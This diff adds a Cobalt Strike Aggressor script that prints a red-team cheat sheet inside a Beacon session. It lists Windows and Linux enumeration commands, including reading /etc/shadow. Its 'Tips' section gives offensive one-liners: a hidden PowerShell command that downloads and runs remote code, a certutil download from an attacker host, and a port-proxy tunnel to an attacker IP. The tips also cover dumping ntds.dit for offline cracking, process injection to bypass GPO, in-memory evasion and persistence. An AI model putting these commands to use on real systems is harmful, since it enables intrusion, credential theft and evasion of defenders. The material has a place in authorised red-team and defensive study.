@@ -1,0 +1,197 @@
+#RedTeamRepo
+#Author: @r3dqu1nn
+#A Common Repository for when you forget your RTFM and no googles.
+#https://www.sock-raw.org/wiki/doku.php/start - @ithilgore
+#http://pwnwiki.io/#!index.md
+#https://blog.g0tmi1k.com/2011/08/basic-linux-privilege-escalation/
+#This script will be continuously updated. Any input or feedback is welcomed!! Enjoy and happy hacking!
+
+beacon_command_register("RedRepo", "A large repository of commands and red team tips",
+	"\nSyntax: RedRepo [Option]\n" .
+	"\nList Options: RedRepo [List]\n" .
+	"\nDisplays well known commands for an OS, or diplays great tips or tricks for a Red Team Operator.\n");
+
+alias RedRepo {
+
+	if ($2 ismatch 'List') {
+		local('$out');
+		#blog($1, "\c0\n\nRepo Options\n============");
+		$out = "RedRepo Options\n";
+		$out .= "    \c0===============\n\n";
+		$out .= "    Option                   Description\n";
+		$out .= "\c0    ------                   -----------\n";
+		blog($1, $out);
+		blog2($1, "\cBWindows                  Windows Enumeration Commands");
+		blog2($1, "\cBLinux                    Linux Enumeration Commands");
+		blog2($1, "\cBTips                     Red Team Tips");
+		blog2($1, "\cBList                     List of Options");
+		blog2($1, "\cBSmile                    Happy Hacking!\n");
+
+	}
+
+	if ($2 ismatch 'Windows') {
+
+		blog($1, "\t\c4====== Common Windows Commands ======\n");
+
+		#WMIC Commands
+		blog($1, "\t\c4====== WMIC Enumeration Commands ======\n");
+
+		blog2($1, "\t\cBwmic computersystem get Name,domain,NumberofProcessors,Roles,totalphysicalmemory");
+		blog2($1, "\t\cBwmic desktop get Name,ScreenSaverActive,Wallpaper");
+		blog2($1, "\t\cBwmic netlogin get Caption,Privileges,UserID,UserType,NumberOfLogons,PasswordAge,LogonServer,Workstations");
+		blog2($1, "\t\cBwmic process get CSName,Description,ExecutablePath,ProcessId");
+		blog2($1, "\t\cBwmic service get Caption,Name,PathName,ServiceType,Started,StartMode,StartName");
+		blog2($1, "\t\cBwmic volume get Label,DeviceID,DriveLetter,FileSystem,Capacity,FreeSpace");
+		blog2($1, "\t\cBwmic netuse list full");
+		blog2($1, "\t\cBwmic startup get Caption,Command,Location,User");
+		blog2($1, "\t\cBwmic PRODUCT get Description,InstallDate,InstallLocation,PackageCache,Vendor,Version");
+		blog2($1, "\t\cBwmic qfe get HotFixID,InstalledOn");
+		blog2($1, "\t\cBwmic ntdomain list");
+		blog2($1, "\t\cBwmic bios [list full]\n");
+
+		blog($1, "\t\c4====== Info Harvesting ======\n");
+		#Host Enumeration
+		blog2($1, "\t\cBsysteminfo");
+		blog2($1, "\t\cBsysteminfo | findstr /B /C:\"OS Name\" /C:\"OS Version\"");
+		blog2($1, "\t\cBSET");
+		blog2($1, "\t\cBipconfig /all");
+		blog2($1, "\t\cBroute print");
+		blog2($1, "\t\cBarp -a");
+		blog2($1, "\t\cBnetstat -ano | findstr /I listening");
+		blog2($1, "\t\cBnetstat -ano | findstr /I established");
+		blog2($1, "\t\cBnbtstat -A *target IP*");
+		blog2($1, "\t\cBnslookup");
+		blog2($1, "\t\cBreg query [key]");
+		blog2($1, "\t\cBGet-ItemProperty [key] (PowerShell)");
+		blog2($1, "\t\cBschtasks /query /fo LIST /v");
+		blog2($1, "\t\cBsc query");
+		blog2($1, "\t\cBsc qc [service name]");
+		blog2($1, "\t\cBtasklist /SVC (/S Remote Computer)");
+		blog2($1, "\t\cBDRIVERQUERY");
+		blog2($1, "\t\cBRun C:\\Windows\\System32\\gatherNetworkInfo.vbs script and check results inside C:\\Windows\\System32\\Config");
+		blog2($1, "\t\cBgpresult /z");
+		blog2($1, "\t\cBwhoami /all");
+		blog2($1, "\t\cBnetsh firewall show conf");
+		blog2($1, "\t\cBnetsh wlan show profiles");
+		blog2($1, "\t\cBnetsh advfirewall show allprofiles\n");
+
+		blog($1, "\t\c4======= Net Commands =======\n");
+		#Old School Net Commands
+		blog2($1, "\t\cBnet accounts [/domain]");
+		blog2($1, "\t\cBnet group \"groupname\" [/domain]");
+		blog2($1, "\t\cBnet localgroup \"groupname\" [/domain]");
+		blog2($1, "\t\cBnet view [/domain]");
+		blog2($1, "\t\cBnet session");
+		blog2($1, "\t\cBnet share");
+		blog2($1, "\t\cBnet user [/domain]");
+		blog2($1, "\t\cBnet user [username] [/domain]");
+		blog2($1, "\t\cBnet use * \\\\IP\\C$ /user:username [password]");
+		blog2($1, "\t\cBUse the built in net commands with Beacon! [help net]\n");
+
+	}
+
+	if ($2 ismatch 'Linux') {
+
+		blog($1, "\t\c4====== Common Linux Commands ======\n");
+
+		blog($1, "\t\c4====== Info Harvesting/Host/Network Enumeration ======\n")
+
+		blog2($1, "\t\cBcat /etc/issue");
+		blog2($1, "\t\cBcat /etc/*-release");
+		blog2($1, "\t\cBcat /etc/*-release | grep -E '\"NAME=\"|ID|VERSION|ID_LIKE'");
+		blog2($1, "\t\cBcat /proc/version");
+		blog2($1, "\t\cBrpm -q kernel");
+		blog2($1, "\t\cBdmesg | grep Linux");
+		blog2($1, "\t\cBls /boot | grep vmlinuz-");
+		blog2($1, "\t\cBlsb_release -a");
+		blog2($1, "\t\cBlast -a");
+  		blog2($1, "\t\cBuname -a");
+  		blog2($1, "\t\cBuname -mrs");
+  		blog2($1, "\t\cBid");
+		blog2($1, "\t\cBhistory");
+		blog2($1, "\t\cBarp -a");
+		blog2($1, "\t\cBnetstat -anot");
+		blog2($1, "\t\cBps -elf");
+		blog2($1, "\t\cBps -elf | grep root");
+		blog2($1, "\t\cBls -la /var/www/html/");
+		blog2($1, "\t\cBservice apache2 status");
+		blog2($1, "\t\cBcat /etc/resolv.conf");
+		blog2($1, "\t\cBcat /etc/networks");
+		blog2($1, "\t\cBiptables -L");
+		blog2($1, "\t\cBiptables -L -t nat");
+		blog2($1, "\t\cBlsof -i");
+		blog2($1, "\t\cBcat /etc/services");
+		blog2($1, "\t\cBgrep 80 /etc/services");
+		blog2($1, "\t\cBw");
+		blog2($1, "\t\cBroute -n");
+		blog2($1, "\t\cBcat /etc/passwd");
+		blog2($1, "\t\cBcat /etc/passwd | awk -F : '{if (\$3 > 999 && \$3 < 60001) print \$1,\$3,\$6}'");
+		blog2($1, "\t\cBcat /etc/motd");
+		blog2($1, "\t\cBcat /etc/group");
+		blog2($1, "\t\cBcat /etc/shadow\n");
+
+
+	}
+
+	if ($2 ismatch 'Tips') {
+
+		blog($1, "\t\c4====== Red Team Tips ======\n");
+		#Red Tips
+		blog2($1, "\t\cBhttps://github.com/vysec/RedTips (If you have InterWebs)");
+		blog2($1, "\t\cBhttps://github.com/subTee/ApplicationWhitelistBypassTechniques/blob/master/TheList.txt (InterWebs Required)");
+		blog2($1, "\t\cBNeed a map of the network? Run Bloodhound!! https://github.com/BloodHoundAD/BloodHound");
+		blog2($1, "\t\cBAlways check sysvols!! Domain Controllers will have them, you'll be surprised how some are still viewable by normal users.");
+		blog2($1, "\t\cBnet user a specific user and see if they are executing any logon scripts, those might contain juicy information.");
+		blog2($1, "\t\cBAlways check Desktops/Documents/Downloads/Favorites folders for trails of valuable information left behind.");
+		blog2($1, "\t\cBFind those Fileservers! Sysadmins leave behind all kinds of goodies there.");
+		blog2($1, "\t\cBUse a Windows 7 workstation to tunnel your traffic natively. netsh int portproxy v4tov4 listenport=[port] connecthost=[AttackerIP] connectport=[port]");
+		blog2($1, "\t\cBUse certutil.exe -urlcache -split -f [http://AttackerIP/RemoteFile] to download a file to the target machine.");
+		blog2($1, "\t\cBThe all powerful one-liner powershell.exe -w hidden -nop -ep bypass -c \"IEX ((new-object net.webclient).downloadstring('http://[domainname|IP]:[port]/[file]'))\"");
+		blog2($1, "\t\cBUse tasklist /S [RemoteComputer] /SVC to see if you have access to that remote machine.");
+		blog2($1, "\t\cBEnable RDP through the registry: reg add “HKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\Control\\Terminal Server” /v fDenyTSConnections /t REG_DWORD /d 0 /f");
+		blog2($1, "\t\cBPlease wrap/encode/pack your payloads if you have to drop to disk!");
+		blog2($1, "\t\cBTry to stay in memory and avoid putting files on disk.");
+		blog2($1, "\t\cBLive off the land!! Use what is on the target, native windows binaries are very powerful!");
+		blog2($1, "\t\cBUse AD naming schemes to your advantage, sysadmins are lazy and use organization to help them with all the IT work they do on a daily basis.");
+		blog2($1, "\t\cBEnterprise Admins will almost always have the rights to move laterally to those foreign domain controllers, 9 times out of 10 they use the same password!");
+		blog2($1, "\t\cBInvoke-NinjaCopy.ps1 is super powerful and should be used to grab the ntds.dit and SYSTEM files for offline cracking.");
+		blog2($1, "\t\cBHave multiple points of presence on a network for longer engagements. Persistence can go a long way for Security Operations.");
+		blog2($1, "\t\cBcmd.exe and powershell.exe blocked by GPO? Find a process that's user owned and started on bootup for process injection to bypass that.");
+		blog2($1, "\t\cBJust because you acquired initial access doesn't mean you stop doing recon. Network/Host Enumeration is always the most important part.");
+		blog2($1, "\t\cBInvoke-ReverseDnsLookup.ps1 of powersploit finds those machines on the network that has DNS records and can provide more SA for an attacker.");
+		blog2($1, "\t\cBNeed a Temporary web server? Use Python! python -m SimpleHTTPServer [port]\n");
+
+	}
+
+	if ($2 ismatch 'Smile') {
+		local('$smile');
+		$smile = "\n";
+		$smile .= "\t\c9░░░░░░░░░░░███████░░░░░░░░░░░\n";
+		$smile .= "\t\c9░░░░░░░████░░░░░░░████░░░░░░░\n";
+		$smile .= "\t\c9░░░░░██░░░░░░░░░░░░░░░██░░░░░\n";
+		$smile .= "\t\c9░░░██░░░░░░░░░░░░░░░░░░░██░░░\n";
+		$smile .= "\t\c9░░█░░░░░░░░░░░░░░░░░░░░░░░█░░\n";
+		$smile .= "\t\c9░█░░████░░░░░░░░██████░░░░░█░\n";
+		$smile .= "\t\c9█░░█░░░██░░░░░░█░░░░███░░░░░█\n";
+		$smile .= "\t\c9█░█░░░░░░█░░░░░█░░░░░░░█░░░░█\n";
+		$smile .= "\t\c9█░█████████░░░░█████████░░░░█\n";
+		$smile .= "\t\c9█░░░░░░░░░░░░░░░░░░░░░░░░░░░█\n";
+		$smile .= "\t\c9█░░░░░░░░░░░░░░░░░░░░░░░░░░░█\n";
+		$smile .= "\t\c9█░░░████████████████████░░░░█\n";
+		$smile .= "\t\c9░█░░░█▓▓▓▓▓▓▓▓█████▓▓▓█░░░░█░\n";
+		$smile .= "\t\c9░█░░░░█▓▓▓▓▓██░░░░██▓██░░░░█░\n";
+		$smile .= "\t\c9░░█░░░░██▓▓█░░░░░░░▒██░░░░█░░\n";
+		$smile .= "\t\c9░░░██░░░░██░░░░░░▒██░░░░██░░░\n";
+		$smile .= "\t\c9░░░░░██░░░░███████░░░░██░░░░░\n";
+		$smile .= "\t\c9░░░░░░░███░░░░░░░░░███░░░░░░░\n";
+		$smile .= "\t\c9░░░░░░░░░░█████████░░░░░░░░░░\n";
+		blog($1, $smile);
+	}
+
+	if ($2 is $null) {
+		berror($1, "\c4Need to specify additional syntax! Use the 'List' command for help");
+		blog($1, "\cBSyntax Example: RedRepo Windows");
+	}
+
+}
+
